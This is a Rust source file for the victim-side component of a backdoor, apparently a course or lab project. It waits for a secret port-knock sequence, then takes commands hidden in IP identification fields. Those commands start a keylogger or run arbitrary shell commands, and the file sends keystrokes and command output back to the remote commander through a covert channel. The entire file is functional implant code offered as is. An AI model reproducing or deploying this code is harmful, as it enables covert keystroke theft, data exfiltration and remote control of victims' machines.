use std::net::{IpAddr, Ipv4Addr};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, mpsc};
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use std::fs::File;
use std::io::Write;

use pnet::packet::ipv4::Ipv4Packet;
use pnet::packet::tcp::TcpPacket;
use pnet::packet::Packet;
use pnet::transport::{transport_channel, TransportChannelType::Layer3, TransportReceiver};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::datalink::{self, NetworkInterface};

mod keylogger;
mod covert; 

// Command Codes for Covert IPID Channel
const CMD_START_LOGGER: u8   = 0x10;
const CMD_STOP_LOGGER: u8    = 0x20;
const CMD_UNINSTALL: u8      = 0x30;
const CMD_START_TRANSFER: u8 = 0x40;
const CMD_EOF: u8            = 0x41;

pub struct SimpleRng { state: u64 }
impl SimpleRng {
    pub fn new(seed: u64) -> Self { Self { state: seed } }
    pub fn next_u32(&mut self) -> u32 {
        self.state = self.state.wrapping_mul(6364136223846793005).wrapping_add(1);
        (self.state >> 32) as u32
    }
    pub fn gen_port(&mut self) -> u16 {
        1024 + (self.next_u32() % (65535 - 1024)) as u16
    }
}

pub fn generate_seed(ip: &Ipv4Addr) -> u64 {
    let ip_u32: u32 = (*ip).into();
    let time_step = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs() / 60; 
    (ip_u32 as u64) ^ time_step
}

struct Victim {
    interface: NetworkInterface,
    local_ip: Ipv4Addr,
    keylogger_active: Arc<AtomicBool>,
}

impl Victim {
    fn new() -> Self {
        let (interface, local_ip) = Self::find_active_interface()
            .expect("No active network interface found");
        Self {
            interface,
            local_ip,
            keylogger_active: Arc::new(AtomicBool::new(false)),
        }
    }

    fn find_active_interface() -> Option<(NetworkInterface, Ipv4Addr)> {
        datalink::interfaces().into_iter().find(|iface| {
            iface.is_up() && !iface.is_loopback() && !iface.ips.is_empty()
        }).and_then(|iface| {
            iface.ips.iter().find_map(|ip| {
                if let IpAddr::V4(v4) = ip.ip() { Some((iface.clone(), v4)) } else { None }
            })
        })
    }

    /// Sniffs for the 3-port sequence at Layer 3
    fn wait_for_commander(&self) -> (Ipv4Addr, u16, u16) {
        let protocol = Layer3(IpNextHeaderProtocols::Tcp);
        let (_, mut rx) = transport_channel(4096, protocol)
            .expect("Error opening Layer 3 channel (Try sudo/doas)");

        println!("[*] Layer 3 Listener active on {}", self.local_ip);
        let mut knock_idx = 0;
        let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);

        loop {
            let current_seed = generate_seed(&self.local_ip);
            let mut rng = SimpleRng::new(current_seed);
            let sequence = [rng.gen_port(), rng.gen_port(), rng.gen_port()];
            let c2_tx_port = rng.gen_port(); // Victim RX (Cmds)
            let c2_rx_port = rng.gen_port(); // Victim TX (Keys)

            if let Ok((ip_pkt, _)) = rx_iter.next() {
                if let Some(tcp_pkt) = TcpPacket::new(ip_pkt.payload()) {
                    let dest_port = tcp_pkt.get_destination();

                    if dest_port == sequence[knock_idx] {
                        knock_idx += 1;
                        println!("[*] Knock {}/3 matched (Port {})", knock_idx, dest_port);
                        
                        if knock_idx == sequence.len() {
                            println!("[+] Auth Success. Derived Command Port: {}", c2_tx_port);
                            return (ip_pkt.get_source(), c2_rx_port, c2_tx_port);
                        }
                    } else if knock_idx > 0 && dest_port != sequence[knock_idx-1] {
                        knock_idx = 0;
                    }
                }
            }
        }
    }

    pub fn run(&mut self) {
        let (commander_ip, tx_port, rx_port) = self.wait_for_commander();
        
        // The covert channel transmitter still needs the datalink interface to send raw packets
        let (transmitter, _) = covert::CovertChannel::new(
            &self.interface, commander_ip, self.local_ip, tx_port, rx_port
        );
        
        // Open a new Layer 3 receiver for the command loop
        let protocol = Layer3(IpNextHeaderProtocols::Tcp);
        let (_, rx) = transport_channel(4096, protocol).unwrap();

        println!("[*] Entering Layer 3 Command Loop...");
        self.process_commands(rx, transmitter);
    }

    fn process_commands(&mut self, mut rx: TransportReceiver, mut transmitter: covert::CovertChannel) {
        let mut string_buffer = String::new();
        let (key_tx, key_rx) = mpsc::channel::<u8>();
        let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);

        loop {
            // 1. Send captured keys
            while let Ok(byte) = key_rx.try_recv() {
                transmitter.send_byte(byte);
                thread::sleep(Duration::from_micros(500));
            }

            // 2. Receive Commands via Layer 3 IPID
            if let Ok((ip_pkt, _)) = rx_iter.next() {
                if let Some(tcp_pkt) = TcpPacket::new(ip_pkt.payload()) {
                    if tcp_pkt.get_destination() == transmitter.config.listen_port {
                        
                        // Extract the data from the IPID field
                        let byte = (ip_pkt.get_identification() & 0xFF) as u8;
                        println!("[DEBUG] L3 Recv: 0x{:02X} from {}", byte, ip_pkt.get_source());

                        match byte {
                            CMD_START_LOGGER => {
                                if !self.keylogger_active.load(Ordering::SeqCst) {
                                    self.keylogger_active.store(true, Ordering::SeqCst);
                                    let flag = self.keylogger_active.clone();
                                    let tx_clone = key_tx.clone();
                                    thread::spawn(move || { 
                                        let _ = keylogger::run_with_flag(flag, tx_clone); 
                                    });
                                    println!("[+] Logger Thread Spawned.");
                                }
                            },
                            CMD_STOP_LOGGER => {
                                self.keylogger_active.store(false, Ordering::SeqCst);
                                println!("[-] Logger Thread Stopped.");
                            },
                            CMD_UNINSTALL => std::process::exit(0),
                            b'\n' => {
                                self.execute_shell(&string_buffer, &mut transmitter);
                                string_buffer.clear();
                            },
                            _ => {
                                if byte >= 32 && byte <= 126 {
                                    string_buffer.push(byte as char);
                                }
                            }
                        }
                    }
                }
            }
            thread::sleep(Duration::from_millis(1));
        }
    }

    fn execute_shell(&self, cmd: &str, transmitter: &mut covert::CovertChannel) {
        if let Ok(out) = std::process::Command::new("sh").arg("-c").arg(cmd).output() {
            for b in out.stdout {
                transmitter.send_byte(b);
                thread::sleep(Duration::from_micros(500));
            }
        }
    }
}

fn main() { 
    println!("=== Victim L3 Initialized ===");
    Victim::new().run(); 
}
